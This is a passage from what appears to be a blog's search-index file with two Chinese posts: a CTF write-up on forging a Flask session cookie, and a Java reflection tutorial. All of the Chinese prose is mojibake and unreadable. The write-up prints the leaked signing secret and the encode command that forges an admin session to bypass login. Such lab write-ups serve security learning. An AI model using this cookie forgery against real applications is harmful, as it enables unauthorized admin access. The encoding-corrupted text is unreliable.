&#x27;.eJyrVsrJT8_Mi08tKsovUrIqKSpN1VEqSCwuLs8vSlGyUipJLS4xNDRU0lEqLkksKS0GCpUWpxYB-SAqLzE3FapIqRYA7_MZ7A.Zzr02A.cbGkQjMXcWrkDVwMdM77W1k-KBI&#x27; -s &#x27;W3l1com_isCTF&#x27;       </span><br><span class="line">&#123;&#x27;login_error&#x27;: True, &#x27;password&#x27;: &#x27;test111&#x27;, &#x27;status&#x27;: &#x27;user&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;</span><br></pre></td></tr></table></figure><p>åªæ˜¯ä¸ªç™»å½•æŠ¥é”™ è¿˜å¾—å®¡è®¡ä¸‹é™„ä»¶ç»™çš„æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç å¯ä»¥å‘ç°æˆ‘ä»¬åªè¦ ä¼ªé€ admin å°±ä¼šé‡å®šå‘åˆ° &#x2F;admin è¿™ä¸ªè·¯ç”±</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;password&#x27;: &#x27;admin222&#x27;, &#x27;status&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; -s &quot;W3l1com_isCTF&quot;</span><br><span class="line"></span><br><span class="line">.eJyrVipILC4uzy9KUbJSSkzJzcwzMjJS0lEqLkksKS2GiQEFSotTi_ISc1PhQrUAUyMTvw.Zzv_wA.FVJA55ixFNYaH2_r_-uxCrZqN4U</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®è¿™ä¸ªè·¯ç”±&#x2F;admin å‘ç°è¿›å…¥åå° ç„¶åè¿˜å¾—ç»§ç»­å®¡è®¡ä»£ç  åé¢çš„å†…å®¹å°±æ˜¯ ååºåˆ—åŒ–çš„å†…å®¹ </p><p>æ”¾åœ¨å…¶ä»–åœ°æ–¹è®²</p><p>æ€»ä¹‹session ä¼ªé€  é¦–å…ˆ çœ‹cookie æ˜¯ä¸æ˜¯ä¼ å…¥çš„session å…¶æ¬¡ éœ€è¦ ç»™çš„å¯†é’¥ ç„¶å æ ¹æ®éœ€æ±‚ éœ€è¦ä¼ªé€ æˆä»€ä¹ˆ åº”è¯¥å·®ä¸å¤šå°±æ˜¯è¿™æ ·äº†</p>]]></content>
      
      
      <categories>
          
          <category> session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ</title>
      <link href="/2024/10/23/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
      <url>/2024/10/23/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡æ›´æ–°è‡ªå·±çš„blog è¿™ä¸€ä¸ªæœˆç¡®å®å¤ªå¤šäº‹æƒ…äº† æ”¾ä¸‹äº†è‡ªå·±ctfçš„å­¦ä¹ è¿›åº¦ è¯è¯´è¿˜æ˜¯è¾¹åšç¬”è®°å˜å­¦ä¹ æœ‰æ•ˆç‡</p><h1 id="Javaç¨‹åºè¿è¡ŒåŸç†"><a href="#Javaç¨‹åºè¿è¡ŒåŸç†" class="headerlink" title="Javaç¨‹åºè¿è¡ŒåŸç†"></a>Javaç¨‹åºè¿è¡ŒåŸç†</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Javaç¨‹åºè¿è¡ŒåŸç†å…¶å®æœ¬è´¨ä¸Šå°±æ˜¯Javaè™šæ‹Ÿæœºä¸è·¨å¹³å°åŸç†</span><br></pre></td></tr></table></figure><p>Javaç¨‹åºçš„è¿è¡Œè¿‡ç¨‹å°±åƒâ€œ<strong>ç¿»è¯‘å®˜å¸¦ç€èœè°±å»ä¸åŒå›½å®¶çš„å¨æˆ¿åšé¥­</strong>â€ï¼Œæ ¸å¿ƒæ˜¯<strong>è·¨å¹³å°æ‰§è¡Œ</strong>å’Œ<strong>è‡ªåŠ¨ç®¡ç†å†…å­˜</strong>ã€‚</p><p><strong>1.å†™ä»£ç â†’ç¿»è¯‘æˆé€šç”¨èœè°± (ç¼–è¯‘)</strong><br>Â·ä½ å†™çš„ä»£ç ï¼šç”¨Javaè¯­æ³•å†™å¥½çš„javaæ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€ä¸ªâ€œè¥¿çº¢æŸ¿ç‚’è›‹â€çš„èœè°±ï¼ˆä»£ç ï¼‰<br>Â·ç¼–è¯‘æˆå­—èŠ‚ç ï¼šç”¨javacå‘½ä»¤æŠŠä»£ç ç¿»è¯‘æˆ.classæ–‡ä»¶ï¼ˆå­—èŠ‚ç ï¼‰ã€‚è¿™ç›¸å½“äºæŠŠä¸­æ–‡èœè°±è½¬æˆâ€œå›½é™…é€šç”¨èœ<br>è°±â€ï¼ˆå­—èŠ‚ç ï¼‰ï¼Œä»»ä½•å›½å®¶çš„å¨æˆ¿ï¼ˆæ“ä½œç³»ç»Ÿï¼‰éƒ½èƒ½çœ‹æ‡‚ã€‚</p><p><strong>å…³é”®ç‚¹ï¼š</strong><br>Â·å­—èŠ‚ç ä¸æ˜¯æœºå™¨ç ï¼Œè€Œæ˜¯ä¸€ç§ä¸­é—´æ ¼å¼ï¼Œç±»ä¼¼â€œé€šç”¨èœè°±â€ï¼Œéœ€è¦äºŒæ¬¡ç¿»è¯‘ã€‚<br>Â·è·¨å¹³å°çš„å…³é”®ï¼šæ¯ä¸ªå›½å®¶ï¼ˆæ“ä½œç³»ç»Ÿï¼‰é…ä¸€ä¸ªç¿»è¯‘å®˜ï¼ˆJVMï¼‰å°±èƒ½ç”¨åŒä¸€ä»½èœè°±</p><p><strong>2.å¨æˆ¿å¼€å·¥â†’JVMåŠ è½½å¹¶æ‰§è¡Œ</strong><br>Â·å¯åŠ¨JVMï¼šè¿è¡Œjavaå‘½ä»¤æ—¶ï¼Œç›¸å½“äºè¯·æ¥ç¿»è¯‘å®˜ï¼ˆJVMï¼‰è¿›å¨æˆ¿ã€‚<br>Â·ç±»åŠ è½½å™¨æ¬é£Ÿæï¼šJVMçš„â€œæ¬è¿å·¥â€ï¼ˆç±»åŠ è½½å™¨ï¼‰æŠŠèœè°±ï¼ˆå­—èŠ‚ç ï¼‰å’Œé£Ÿæï¼ˆç±»ä¿¡æ¯ï¼‰æ¬åˆ°å¨æˆ¿çš„ä¸åŒåŒºåŸŸï¼š<br>ã€‚æ–¹æ³•åŒºï¼šå­˜æ”¾èœè°±æ­¥éª¤ï¼ˆç±»ç»“æ„ã€é™æ€å˜é‡ï¼‰ã€‚<br>ã€‚å †å†…å­˜ï¼šæ”¾ç‚’èœç”¨çš„é”…ç¢—ç“¢ç›†ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰ï¼Œæ¯”å¦‚â€œè¥¿çº¢æŸ¿â€å’Œâ€œé¸¡è›‹â€å¯¹è±¡ã€‚<br>ã€‚æ ˆå†…å­˜ï¼šè®°å½•å½“å‰ç‚’èœçš„æ­¥éª¤ï¼ˆæ–¹æ³•è°ƒç”¨æ ˆï¼‰ï¼Œæ¯”å¦‚â€œå…ˆçƒ­é”…å†å€’æ²¹â€ã€‚<br><strong>å…³é”®ç‚¹ï¼š</strong><br>Â·JVMè‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œä¸ç”¨æ‰‹åŠ¨æ¸…ç†(åƒåœ¾å›æ”¶ï¼‰<br>Â·æ¯ä¸ªçº¿ç¨‹ï¼ˆå¨å¸ˆï¼‰æœ‰è‡ªå·±çš„å·¥ä½œå°(æ ˆ)ã€‚</p><p><strong>3.è¾¹ç‚’èœè¾¹ä¼˜åŒ–â†’è§£é‡Šæ‰§è¡Œ&amp;å³æ—¶ç¼–è¯‘(JIT)</strong><br>Â·è§£é‡Šæ‰§è¡Œï¼šç¿»è¯‘å®˜ï¼ˆJVMï¼‰é€è¡Œè¯»èœè°±ï¼ˆå­—èŠ‚ç ï¼‰ï¼Œè½¬æˆæœºå™¨èƒ½æ‰§è¡Œçš„æŒ‡ä»¤ã€‚æ¯”å¦‚â€œåˆ‡è¥¿çº¢æŸ¿â€ç¿»è¯‘æˆæœºå™¨ç ã€‚<br>Â·å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰ï¼šå¦‚æœæŸæ­¥éª¤é‡å¤å¤šæ¬¡ï¼ˆæ¯”å¦‚â€œç¿»ç‚’â€ï¼‰ï¼ŒJVMä¼šæŠŠè¿™éƒ¨åˆ†ç¼–è¯‘æˆæœºå™¨ç ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡ç›´æ¥æ‰§<br>è¡Œï¼ŒåŠ å¿«é€Ÿåº¦<br><strong>å…³é”®ç‚¹ï¼š</strong><br>Â·è§£é‡Šæ‰§è¡Œé€‚åˆå¯åŠ¨å¿«ï¼Œå³æ—¶ç¼–è¯‘é€‚åˆé•¿æœŸè¿è¡Œçš„é«˜æ•ˆã€‚<br>Â·ç±»ä¼¼å¨å¸ˆè®°ä½å¸¸ç”¨æ­¥éª¤ï¼Œä¸ç”¨æ¯æ¬¡éƒ½çœ‹èœè°±ã€‚</p><p><strong>4.æ”¶å°¾â†’åƒåœ¾å›æ”¶</strong><br>Â·è‡ªåŠ¨æ¸…ç†ï¼šç‚’å®Œèœåï¼ŒJVMçš„â€œæ¸…æ´å·¥â€ï¼ˆåƒåœ¾å›æ”¶å™¨ï¼‰ä¼šè‡ªåŠ¨æ‰”æ‰ç”¨è¿‡çš„é”…ï¼ˆæ— å¼•ç”¨çš„å¯¹è±¡ï¼‰ï¼Œè…¾å‡ºå †å†…å­˜</p><p>Â·åˆ†ä»£å›æ”¶ï¼šæ–°é”…ï¼ˆæ–°ç”Ÿä»£ï¼‰å’Œæ—§é”…ï¼ˆè€å¹´ä»£ï¼‰åˆ†å¼€æ¸…ç†ï¼Œæé«˜æ•ˆç‡69ã€‚</p><h1 id="Javaåå°„æœºåˆ¶"><a href="#Javaåå°„æœºåˆ¶" class="headerlink" title="Javaåå°„æœºåˆ¶"></a>Javaåå°„æœºåˆ¶</h1><p><strong>åå°„å°±æ˜¯åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“è¦æ“ä½œçš„ç±»æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„å®Œæ•´æ„é€ ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ Java çš„åå°„æœºåˆ¶ï¼Œç¨‹åºå‘˜å¯ä»¥æ›´æ·±å…¥åœ°æ§åˆ¶ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ç”±ç”¨æˆ·è¾“å…¥ä¸€ä¸ªç±»åï¼Œç„¶ååŠ¨æ€è·å–è¯¥ç±»æ‹¥æœ‰çš„æ„é€ ã€å±æ€§å’Œæ–¹æ³•ï¼Œç”šè‡³è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨Javaå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨newå…³é”®å­—æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶ååœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™JVMå°±ä¼šç›¸åº”çš„ç”Ÿæˆè¿™ä¸ªå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸€æ—¦ç¡®å®šäº†è¿™ä¸ªç±»ä»¥åŠå¯¹è±¡ï¼Œé‚£ä¹ˆå°±æ— æ³•è¿›è¡Œä¿®æ”¹ã€‚</p><p><strong>é‚£ä¹ˆå¯ä¸å¯ä»¥åœ¨æˆ‘ä»¬ç¨‹åºè¿è¡Œçš„æ—¶å€™åŠ¨æ€çš„ç”Ÿæˆä¸€ä¸ªå¯¹è±¡å‘¢ï¼Ÿ</strong></p><p>å½“ç„¶å¯ä»¥ã€‚æˆ‘ä»¬æŠŠJavaç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™æ ¹æ®éœ€è¦åŠ¨æ€ç”Ÿæˆçš„å¯¹è±¡ç§°ä¸ºJavaçš„åå°„æœºåˆ¶ã€‚</p><p>åœ¨ç¨‹åº<strong>è¿è¡Œ</strong>çš„æ—¶å€™<strong>åŠ¨æ€</strong>åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹<br>å‘¨ç”¨å®ä¾‹çš„æ–¹æ³•å’Œè®¿é—®å®ƒçš„<strong>å±æ€§</strong></p><p>Javaä»£ç è¿è¡ŒåŸç†ï¼š<br>æºç <br>ç¼–è¯‘å™¨(javac)çºŸç¼–è¯‘ä¸ºå­—èŠ‚ç .classæ–‡ä»¶<br>å„å¹³å°JVMè§£é‡Šå™¨æŠŠå­—èŠ‚ç æ–‡ä»¶è½¬æ¢æˆæ“ä½œç³»ç»Ÿ<br>æŒ‡ä»¤(è·¨å¹³å°)</p><p>äº†è§£ä¸‹ä»€ä¹ˆæ˜¯åå°„</p><h2 id="Javaåå°„æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Javaåå°„æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Javaåå°„æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ"></a>Javaåå°„æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p><a href="https://c.biancheng.net/java/">Java</a> åå°„æœºåˆ¶æ˜¯ Java è¯­è¨€çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ã€‚åœ¨å­¦ä¹  Java åå°„æœºåˆ¶å‰ï¼Œå¤§å®¶åº”è¯¥å…ˆäº†è§£ä¸¤ä¸ªæ¦‚å¿µï¼Œç¼–è¯‘æœŸå’Œè¿è¡ŒæœŸã€‚</p><p><strong>ç¼–è¯‘æœŸ</strong>æ˜¯æŒ‡æŠŠæºç äº¤ç»™ç¼–è¯‘å™¨ç¼–è¯‘æˆè®¡ç®—æœºå¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶çš„è¿‡ç¨‹ã€‚åœ¨ Java ä¸­ä¹Ÿå°±æ˜¯æŠŠ Java ä»£ç ç¼–æˆ class æ–‡ä»¶çš„è¿‡ç¨‹ã€‚ç¼–è¯‘æœŸåªæ˜¯åšäº†ä¸€äº›ç¿»è¯‘åŠŸèƒ½ï¼Œå¹¶æ²¡æœ‰æŠŠä»£ç æ”¾åœ¨å†…å­˜ä¸­è¿è¡Œèµ·æ¥ï¼Œè€Œåªæ˜¯æŠŠä»£ç å½“æˆæ–‡æœ¬è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚æ£€æŸ¥é”™è¯¯ã€‚</p><p><strong>è¿è¡ŒæœŸ</strong>æ˜¯æŠŠç¼–è¯‘åçš„æ–‡ä»¶äº¤ç»™è®¡ç®—æœºæ‰§è¡Œï¼Œç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸã€‚æ‰€è°“è¿è¡ŒæœŸå°±æŠŠåœ¨ç£ç›˜ä¸­çš„ä»£ç æ”¾åˆ°å†…å­˜ä¸­æ‰§è¡Œèµ·æ¥ã€‚</p><p>Java åå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œ<strong><strong>å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„æ–¹æ³•å’Œå±æ€§ï¼›</strong>è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸º Java è¯­è¨€çš„åå°„æœºåˆ¶**</strong>ã€‚ç®€å•æ¥è¯´ï¼Œåå°„æœºåˆ¶æŒ‡çš„æ˜¯ç¨‹åºåœ¨è¿è¡Œæ—¶èƒ½å¤Ÿè·å–è‡ªèº«çš„ä¿¡æ¯ã€‚åœ¨ Java ä¸­ï¼Œåªè¦ç»™å®šç±»çš„åå­—ï¼Œå°±å¯ä»¥é€šè¿‡åå°„æœºåˆ¶æ¥è·å¾—ç±»çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p>Java åå°„æœºåˆ¶åœ¨æœåŠ¡å™¨ç¨‹åºå’Œä¸­é—´ä»¶ç¨‹åºä¸­å¾—åˆ°äº†å¹¿æ³›è¿ç”¨ã€‚åœ¨æœåŠ¡å™¨ç«¯ï¼Œå¾€å¾€éœ€è¦æ ¹æ®å®¢æˆ·çš„è¯·æ±‚ï¼ŒåŠ¨æ€è°ƒç”¨æŸä¸€ä¸ªå¯¹è±¡çš„ç‰¹å®šæ–¹æ³•ã€‚æ­¤å¤–ï¼Œåœ¨ ORM ä¸­é—´ä»¶çš„å®ç°ä¸­ï¼Œè¿ç”¨ Java åå°„æœºåˆ¶å¯ä»¥è¯»å–ä»»æ„ä¸€ä¸ª JavaBean çš„æ‰€æœ‰å±æ€§ï¼Œæˆ–è€…ç»™è¿™äº›å±æ€§èµ‹å€¼ã€‚</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1729667020117.png" alt="img"></p><p>è¿™é‡Œçš„åå°„æ–¹å¼</p><ol><li><p><strong>å®ä¾‹åŒ–å¯¹è±¡</strong>ï¼š</p><ul><li>åœ¨åå°„æœºåˆ¶ä¸­ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªå¯¹è±¡ï¼ˆæˆ–è€…ä¸çŸ¥é“å¯¹è±¡ç±»å‹æ—¶ï¼‰ï¼Œå®ƒå¯ä»¥æ˜¯ä»»ä½•ç±»çš„å®ä¾‹ã€‚</li></ul></li><li><p><strong>è°ƒç”¨ <code>getClass()</code> æ–¹æ³•</strong>ï¼š</p><ul><li>é€šè¿‡è°ƒç”¨è¯¥å¯¹è±¡çš„ <code>getClass()</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å–è¯¥å¯¹è±¡çš„ç±»ç±»å‹ã€‚è¿™ç§æ–¹å¼ä¸éœ€è¦åœ¨ç¼–å†™ä»£ç æ—¶æå‰çŸ¥é“å¯¹è±¡çš„å…·ä½“ç±»å‹ã€‚</li></ul></li><li><p><strong>å¾—åˆ°å®Œæ•´çš„åŒ…ç±»åç§°</strong>ï¼š</p><ul><li><p>ä½¿ç”¨ <code>getClass()</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å–è¯¥å¯¹è±¡çš„å®Œæ•´ç±»åï¼Œè¿™åŒ…æ‹¬å…¶æ‰€åœ¨çš„åŒ…åã€‚è¿™å¯¹äºåŠ¨æ€å¤„ç†å’Œè°ƒè¯•éå¸¸æœ‰ç”¨ã€‚</p></li><li><pre><code>- **æ­£å¸¸æ–¹å¼**é€‚åˆé™æ€ç±»å‹çš„è¯­è¨€æˆ–ä¸éœ€è¦åŠ¨æ€å¤„ç†çš„åœºæ™¯ï¼Œæ˜¾å¼ç±»çš„å¼•å…¥å’Œå®ä¾‹åˆ›å»ºã€‚- **åå°„æ–¹å¼**é€‚åˆéœ€è¦åŠ¨æ€ç±»å¤„ç†çš„åœºæ™¯ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æ ¹æ®å¯¹è±¡çš„ç±»å‹åšå‡ºä¸åŒçš„å¤„ç†ï¼Œæä¾›æ›´å¤§çš„çµæ´»æ€§ã€‚<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     Java åå°„æœºåˆ¶ä¸»è¦æä¾›äº†ä»¥ä¸‹åŠŸèƒ½ï¼Œè¿™äº›åŠŸèƒ½éƒ½ä½äº`java.lang.reflect`åŒ…ã€‚</span><br><span class="line"></span><br><span class="line">     - åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ã€‚</span><br><span class="line">     - åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡ã€‚</span><br><span class="line">     - åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•ã€‚</span><br><span class="line">     - åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚</span><br><span class="line">     - ç”ŸæˆåŠ¨æ€ä»£ç†ã€‚</span><br><span class="line"></span><br><span class="line">ä¼—æ‰€å‘¨çŸ¥ï¼Œæ‰€æœ‰ Java ç±»å‡ç»§æ‰¿äº† Object ç±»ï¼Œåœ¨ Object ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ª getClass() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›åŒä¸€ä¸ªç±»å‹ä¸º Class çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„ç¤ºä¾‹ä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Class labelCls = label1.getClass();    // label1ä¸º JLabel ç±»çš„å¯¹è±¡</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ol><p>åˆ©ç”¨ Class ç±»çš„å¯¹è±¡ labelCls å¯ä»¥è®¿é—® labelCls å¯¹è±¡çš„æè¿°ä¿¡æ¯ã€JLabel ç±»çš„ä¿¡æ¯ä»¥åŠåŸºç±» Object çš„ä¿¡æ¯ã€‚è¡¨ 1 åˆ—å‡ºäº†é€šè¿‡åå°„å¯ä»¥è®¿é—®çš„ä¿¡æ¯ã€‚</p><ol><li>è·å–ç±»ä¿¡æ¯ï¼šé€šè¿‡ <code>Class.forName()</code> æ–¹æ³•è·å–æŸä¸ªç±»çš„ <code>Class</code> å¯¹è±¡ï¼Œç„¶åä½¿ç”¨ <code>Class</code> å¯¹è±¡çš„å„ç§æ–¹æ³•è·å–ç±»çš„ä¿¡æ¯ï¼Œå¦‚ <code>getName()</code> è·å–ç±»åï¼Œ<code>getDeclaredMethods()</code> è·å–æ‰€æœ‰æ–¹æ³•ç­‰ã€‚</li><li>åˆ›å»ºå¯¹è±¡ï¼šé€šè¿‡ <code>Class</code> å¯¹è±¡çš„ <code>getConstructor()</code> æˆ– <code>getDeclaredConstructor()</code> æ–¹æ³•è·å–æŒ‡å®šæ„é€ å‡½æ•°çš„å¼•ç”¨ï¼Œç„¶åä½¿ç”¨ <code>newInstance()</code> æˆ– <code>newInstance()</code> æ–¹æ³•åˆ›å»ºå¯¹è±¡ã€‚</li><li>è®¿é—®å±æ€§ï¼šé€šè¿‡ <code>Class</code> å¯¹è±¡çš„ <code>getDeclaredField()</code> æ–¹æ³•è·å–æŒ‡å®šå±æ€§çš„å¼•ç”¨ï¼Œç„¶åä½¿ç”¨ <code>set()</code> æˆ– <code>get()</code> æ–¹æ³•è®¾ç½®æˆ–è·å–å±æ€§çš„å€¼ã€‚</li><li>è°ƒç”¨æ–¹æ³•ï¼šé€šè¿‡ <code>Class</code> å¯¹è±¡çš„ <code>getDeclaredMethod()</code> æ–¹æ³•è·å–æŒ‡å®šæ–¹æ³•çš„å¼•ç”¨ï¼Œç„¶åä½¿ç”¨ <code>invoke()</code> æ–¹æ³•è°ƒç”¨æ–¹æ³•å¹¶ä¼ é€’å‚æ•°ã€‚</li><li>åŠ¨æ€ä»£ç†ï¼šé€šè¿‡ Java åå°„å®ç°åŠ¨æ€ä»£ç†ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åˆ›å»ºä¸€ä¸ªå®ç°äº†æŒ‡å®šæ¥å£çš„ä»£ç†ç±»ï¼Œå¹¶å®ç°æŒ‡å®šçš„æ–¹æ³•é€»è¾‘ã€‚</li></ol><p>æ›´å¤šçš„å¯ä»¥å»çœ‹<a href="https://y4er.com/posts/java-deserialization-1/">https://y4er.com/posts/java-deserialization-1/</a></p><p>æˆ‘è§‰å¾—å†™çš„è¿˜è¡Œçš„</p><p>ä»€ä¹ˆæ˜¯åå°„ï¼Ÿåå°„ä¹‹ä¸­åŒ…å«äº†ä¸€ä¸ªã€Œåã€å­—ï¼Œæ‰€ä»¥æƒ³è¦è§£é‡Šåå°„å°±å¿…é¡»å…ˆä»ã€Œæ­£ã€å¼€å§‹è§£é‡Šã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µä»£ç </p><table><thead><tr><th><strong><code>1  </code></strong></th><th><strong><code>fanshe testObj = new fanshe();  </code></strong></th></tr></thead><tbody><tr><td><strong><code>2</code></strong></td><td><strong><code>testObj.setPrice(5);</code></strong></td></tr></tbody></table><p>å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡newåˆ›å»ºäº†ä¸€ä¸ª<code>fanshe</code>ç±»çš„å¯¹è±¡<code>testObj</code>ï¼Œè¿™æ˜¯[æ­£å°„]ã€‚åœ¨è¿™ä¸ªå®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ç±»åï¼Œ<strong>é‚£ä¹ˆå®é™…å¼€å‘ä¸­å¦‚æœæˆ‘ä»¬ä¸ç¡®å®šç±»åçš„è¯å°±æ²¡åŠæ³•<code>new</code>ä¸€ä¸ªå®ä¾‹äº†ï¼Œä¸ºæ­¤javaæäº†ä¸€ä¸ªåå°„å‡ºæ¥ã€‚</strong></p><p>æ‰€ä»¥åå°„å°±æ˜¯åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“è¦æ“ä½œçš„ç±»æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„å®Œæ•´æ„é€ ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³•</p><hr><h3 id="ä¸€ã€é€šè¿‡è®¿é—®æƒé™åŒºåˆ†"><a href="#ä¸€ã€é€šè¿‡è®¿é—®æƒé™åŒºåˆ†" class="headerlink" title="ä¸€ã€é€šè¿‡è®¿é—®æƒé™åŒºåˆ†"></a><strong>ä¸€ã€é€šè¿‡è®¿é—®æƒé™åŒºåˆ†</strong></h3><p>åå°„å¯é€šè¿‡ä¸åŒæ–¹æ³•è·å–ç±»æˆå‘˜çš„è®¿é—®æƒé™ï¼š</p><ol><li><p><strong>å…¬æœ‰æˆå‘˜</strong><br>ä½¿ç”¨ <code>getFields()</code> æˆ– <code>getMethods()</code>ï¼Œè·å–æ‰€æœ‰<strong>å…¬æœ‰å­—æ®µ&#x2F;æ–¹æ³•ï¼ˆåŒ…æ‹¬ç»§æ‰¿çš„ï¼‰</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] publicFields = MyClass.class.getFields();</span><br><span class="line">Method[] publicMethods = MyClass.class.getMethods();</span><br></pre></td></tr></table></figure></li><li><p><strong>æ‰€æœ‰æˆå‘˜ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰</strong><br>ä½¿ç”¨ <code>getDeclaredFields()</code> æˆ– <code>getDeclaredMethods()</code>ï¼Œè·å–<strong>æœ¬ç±»æ‰€æœ‰å­—æ®µ&#x2F;æ–¹æ³•ï¼ˆä¸åŒ…å«ç»§æ‰¿çš„ï¼‰</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] allFields = MyClass.class.getDeclaredFields();</span><br><span class="line">Method[] allMethods = MyClass.class.getDeclaredMethods();</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ¤æ–­å…·ä½“ä¿®é¥°ç¬¦</strong><br>é€šè¿‡ <code>Modifier</code> ç±»åˆ†æè®¿é—®æƒé™ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> MyClass.class.getDeclaredField(<span class="string">&quot;privateField&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> 